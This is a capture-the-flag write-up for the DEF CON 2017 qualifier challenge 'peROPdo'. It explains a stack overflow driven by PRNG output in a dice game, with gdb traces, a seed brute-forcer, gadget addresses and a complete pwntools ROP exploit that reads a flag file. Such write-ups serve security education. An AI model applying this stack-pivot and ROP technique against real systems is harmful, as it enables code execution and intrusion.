---
title: "Potent Pwnables) peROPdo"
sidebar_position: 1
---
## **Information**

### **Description**
```
Shall we play a game?

peropdo\_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me 80

Files <https://2017.notmalware.ru/546864f14defe52b0f2de70bf45603668278a151/peropdo>
```
### **File**

* [peropdo](/attachments/1147550/1147549.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2017/tree/master/peropdo>

## **Writeup**

### File information

```bash title="File information"
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$ file peropdo 
peropdo: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=ff28acf005e647b8d705997bebcf600a073a32b0, stripped
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$ checksec.sh --file peropdo 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   peropdo
lazenca0x0@ubuntu:~/CTF/DEFCON2017/peROPdo$
```

### **Binary analysis**

#### **Main**

* **This function performs the following operations:**
  + Reads user input into global variable `&gName` using `scanf("%s", &gName)`.
  + Uses `gName` as the PRNG seed in `__srandom(gName)`.
  + Invokes `gameplay((int)&gName)`.

```c title="main"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _IO_puts("What is your name?");
  _IO_fflush(off_80EB560);
  scanf("%s", &gName);
  __srandom(gName);
  return gameplay((int)&gName);
}
```

#### **gameplay**

* **This function performs the following operations:**
  + Prompts the user for the number of dice to roll (`rollCount`).
  + Calls `random()` `rollCount` times and stores generated values into array `numList[]`.
  + Computes `diceNumber % 6 + 1` and prints the dice roll results.
* **Vulnerability (Stack Buffer Overflow via PRNG Output):**
  + There is no boundary check on `rollCount`.
  + Supplying `rollCount >= 23` causes the loop to write past `numList[16]`, overwriting the saved frame pointer (`saved ebp`) and return address on the stack.

```c title="gameplay"
int __cdecl gameplay(int name)
{
  int diceCount; // ebx@2 MAPDST
  int diceNumber; // ecx@5
  int result; // eax@6
  int v5; // [esp+0h] [ebp-1Ch]@2
  int v6; // [esp+4h] [ebp-18h]@2
  int v7; // [esp+8h] [ebp-14h]@1
  char answer; // [esp+1Bh] [ebp-1h]@6
  int rollCount; // [esp+1Ch] [ebp+0h]@2
  int numList[16]; // [esp+20h] [ebp+4h]@3

  dprintf((const char *)1, "Welcome to peROPdo, %s\n", name);
  do
  {
    diceCount = 0;
    _IO_puts("How many dice would you like to roll?");
    _IO_fflush(off_80EB560);
    scanf("%d", (int)&rollCount);
    if ( rollCount > 0 )
    {
      do
        numList[diceCount++] = j____random(v5, v6, v7);
      while ( rollCount > diceCount );
    }
    diceCount = 0;
    dprintf((const char *)1, "You rolled: ");
    if ( rollCount > 0 )
    {
      do
      {
        diceNumber = numList[diceCount++];
        v7 = diceNumber % 6 + 1;
        dprintf((const char *)1, "%d ");
      }
      while ( rollCount > diceCount );
    }
    dprintf((const char *)1, "\nWould you like to play again? ");
    _IO_fflush(off_80EB560);
    result = scanf("%1s", (int)&answer);
  }
  while ( answer == 'y' );
  return result;
}
```

### Structure of Exploit code

:::note
* Input a specially chosen seed string followed by ROP gadgets into `gName`.
* The seed forces PRNG output at `numList[22]` (saved EBP) to equal `0x80ecfff` (inside `gName`).
* When `gameplay()` returns to `main()`, `main()`'s `leave; ret` executes `mov esp, ebp; pop ebp; ret`, pivoting the stack pointer directly into our ROP chain in `gName`.
* The ROP chain opens `./flag`, reads its contents into `.bss`, and writes it to standard output.
:::

### **Information for attack**

#### **Stack Overwrite**

* Check offsets in GDB:
  + `numList[]` buffer starts at `0xbffff370`.
  + Saved EBP is located at `numList[22]` (`0xbffff370 + 4 * 22 = 0xbffff3c8`).
  + Return address is located at `numList[23]` (`0xbffff370 + 4 * 23 = 0xbffff3cc`).

```bash title="Return Address Area check"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/DEFCON/peROPdo/peropdo 
What is your name?
AAAA
Welcome to peROPdo, AAAA
How many dice would you like to roll?
24
Breakpoint 1, 0x08048f1d in ?? ()
gdb-peda$ i r esi
esi            0xbffff370	0xbffff370
gdb-peda$ i r ebx
ebx            0x0	0x0
gdb-peda$ x/24wx 0xbffff370
0xbffff370:	0xffffffff	0x080eb080	0xbffff398	0x0000001f
0xbffff380:	0x0804ef57	0x080eb080	0xbffff398	0x080eb2a0
0xbffff390:	0x080eb2a0	0x00000012	0x62f9e2bc	0x080481a8
0xbffff3a0:	0x00000000	0x080eb00c	0xbffff3e8	0x0804eb26
0xbffff3b0:	0x41414141	0x080eb080	0xbffff3d4	0x080481a8
0xbffff3c0:	0x00000000	0x080eb00c	0xbffff3e8	0x08048b4f
gdb-peda$ x/wx 0xbffff370 + 4 * 23
0xbffff3cc:	0x08048b4f
gdb-peda$ x/2i 0x08048b4f
   0x8048b4f:	leave  
   0x8048b50:	ret    
gdb-peda$
```

* When `gameplay()` exits, `pop ebp` sets EBP to `numList[22]`.
* In `main()`, `leave` (`mov esp, ebp; pop ebp`) pivots ESP to `gName`:

```bash title="gameplay()"
gdb-peda$ x/5i 0x08048FCC
   0x8048fcc:	pop    ebx
   0x8048fcd:	pop    esi
   0x8048fce:	pop    edi
   0x8048fcf:	pop    ebp
   0x8048fd0:	ret    
```

```bash title="main()"
gdb-peda$ x/3i 0x08048B4A
   0x8048b4a:	call   0x8048eb0
   0x8048b4f:	leave  
   0x8048b50:	ret    
```

#### **Find Seed**

* Brute-force program to find a seed producing `numList[22] == 0x80ECFFF`:

```c title="Find seed code"
#include <stdio.h>
#include <stdlib.h>

unsigned int numbers[24];

void main(){
	unsigned int i;
	unsigned int j;

	for(j = 0; j < 0xffffffff; j++){
		srand(j);

		for(i = 0; i < 24; i++){
			numbers[i] = rand();
		}

		if(numbers[22] < 0x80ED040 && 0x80ECFC0 < numbers[22]){
			printf("Find! Seed : %u, Area numbers[22] 0x%x\n", j, numbers[22]);
		}
	}
}
```

* Selected seed: `243015623` (gives `numbers[22] == 0x80ECFFF`).

#### **Find Gadgets**

* `pop edx; ret` : `0x0806f2fa`
* `pop ecx; ret` : `0x080e5ee1`
* `pop ebx; ret` : `0x08064819`
* `pop eax; ret` : `0x080e558a`
* `int 0x80; ret` : `0x0806fae0`

#### **ROP Chain**

```asm title="ROP sequence"
open('./flag', 0)
read(3, .bss + 0x40, 256)
write(1, .bss + 0x40, 256)
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

BINARY = './peropdo'

elf = ELF(BINARY)
p = process(BINARY)

popEdx = 0x0806f2fa 
popEcx = 0x080e5ee1
popEbx = 0x08064819
popEax = 0x080e558a
int0x80 = 0x0806fae0
nameAddr = 0x080ECFC0

#seed
rop = p32(243015623)	# 0x4

rop += '\x00' * 8 		# 0x8
rop += './flag'			# 0x6
rop += '\x00' * 49		# 0x80ecfff - 0x80ecfd2(0x080ECFC0 + 0x4 + 0x8 + 0x6) + 0x4(POP ebp)

#open('./flag', 0)
rop += p32(popEbx)
rop += p32(nameAddr + 12)
rop += p32(popEcx)
rop += p32(0)
rop += p32(popEdx)
rop += p32(0)
rop += p32(popEax)
rop += p32(0x5)
rop += p32(int0x80)

#read(3, bss, 256)
rop += p32(popEbx)
rop += p32(0x3)
rop += p32(popEcx)
rop += p32(elf.bss() + 0x40)
rop += p32(popEdx)
rop += p32(256)
rop += p32(popEax)
rop += p32(0x3)
rop += p32(int0x80)

#write(1, bss, 256)
rop += p32(popEbx)
rop += p32(0x1)
rop += p32(popEcx)
rop += p32(elf.bss() + 0x40)
rop += p32(popEdx)
rop += p32(256)
rop += p32(popEax)
rop += p32(0x4)
rop += p32(int0x80)

log.info("ELF BSS : " + str(hex(elf.bss() + 0x40)))
p.recvuntil('What is your name?')
p.sendline(rop)

p.recvuntil('How many dice would you like to roll?')
p.sendline('23')
p.recvuntil('Would you like to play again?')
p.sendline('n')

log.info("Flag :" + p.readline())
```

## **Flag**

|  |  |
| --- | --- |
| Flag | Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc |

## **Related Site**

* <http://bruce30262.logdown.com/posts/1784510>
* <http://bestwing.me/2017/05/01/2017-defcon-peROPdo/>
* <http://blog.ytn86.net/2017/05/defcon-2017-quals/>
* <https://bamboofox.github.io/2017/05/03/DEFCON-CTF-2017-Quals-peROPdo/>
* <https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux>